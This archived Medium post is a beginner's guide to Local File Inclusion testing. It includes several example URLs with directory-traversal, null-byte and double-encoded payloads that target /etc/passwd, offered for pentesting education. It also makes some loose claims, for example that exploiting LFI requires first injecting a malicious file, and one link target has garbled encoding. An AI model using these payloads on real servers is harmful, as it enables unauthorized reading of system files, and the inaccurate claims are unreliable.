# World of LFI

- **Source URL:** https://medium.com/@ahireayush0/understanding-lfi-571d3f4547d4?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251127155250/https://medium.com/@ahireayush0/understanding-lfi-571d3f4547d4
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3562 (id 3562)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# World of LFI

**Introduction:**

In the vast realm of web application security, it is essential to be acquainted with common vulnerabilities and understand how to test for them. Among these vulnerabilities, Local File Inclusion (LFI) holds significant prominence. In this beginner’s guide to LFI pentesting, we will delve into the concepts, techniques, and best practices necessary for effectively testing and securing web applications against potential LFI exploits.

**Understanding LFI:**

Local File Inclusion (LFI) is a vulnerability that occurs when a web application fails to adequately sanitize user input and inadvertently includes files from the server that should be restricted. An LFI vulnerability can lead to critical information disclosure or even remote code execution. By leveraging this flaw, attackers can compromise the confidentiality and integrity of sensitive data stored on the server. LFI allows an attacker to include a local file on the target system. The attacker can then use this vulnerability to read sensitive files on the system or even execute arbitrary code.

LFI vulnerabilities can be found in several places, including web applications, operating systems, and word processors. In order to exploit an LFI vulnerability, an attacker must first find a way to inject a malicious file into the target system. Once the attacker has injected the malicious file, they can then use the LFI vulnerability to read or execute the file.

LFI attacks are relatively simple to execute, but can be very damaging to the target system. In many cases, an LFI attack can lead to a full compromise of the target system.

To learn more about LFI attacks read on!

**Basic LFI Exploits:**

To conduct successful LFI pentesting, it is crucial to understand the techniques employed by attackers. Let’s explore some common LFI exploits:

**Dot-Dot-Slash (../) Traversal:**

Attackers exploit the “../” traversal sequence to navigate outside the intended directory and access files in higher-level directories. By appending multiple instances of “../”, they can eventually reach critical system files. Pentesters simulate this technique by injecting traversal sequences and analyzing the application’s response to identify potential vulnerabilities.

Eg.

[http://example.com/index.php?page=....//....//....//etc/passwd](http://example.com/index.php?page=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd)

[http://example.com/index.php?page=....\/....\/....\/etc/passwd](http://example.com/index.php?page=....%5C%2F....%5C%2F....%5C%2Fetc%2Fpasswd)

[http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd](http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd)

**Null Byte (%00) Injection:**

Some web applications use null bytes as string terminators. Attackers can append a null byte to their input to bypass input validation and access restricted files. Pentesters incorporate null byte injections in their test payloads to assess if the application is vulnerable to this type of attack.

Eg. 

[http://example.com/index.php?page=../../../etc/passwd%00](http://example.com/index.php?page=..%2F..%2F..%2Fetc%2Fpasswd%00)

**Encoded Character Manipulation:**

Attackers may encode special characters or employ double URL encoding to bypass input filters and manipulate file paths. Encoding characters allows them to evade security mechanisms designed to filter out malicious input. Pentesters experiment with different character encodings to determine if the application is susceptible to this form of LFI exploit.

Eg.

[http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd](http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd)

[http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd](http://example.com/index.php?page=..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BDetc%EF%BF%BD%EF%BF%BDpasswd)

[http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd](http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd)

[http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00](http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00)

**Operating System Differences:**

Different operating systems interpret file paths differently. Attackers exploit these differences to launch platform-specific attacks and gain unauthorized access to files. Pentesters need to account for the target system’s operating system during assessments to ensure comprehensive testing and identification of potential vulnerabilities.
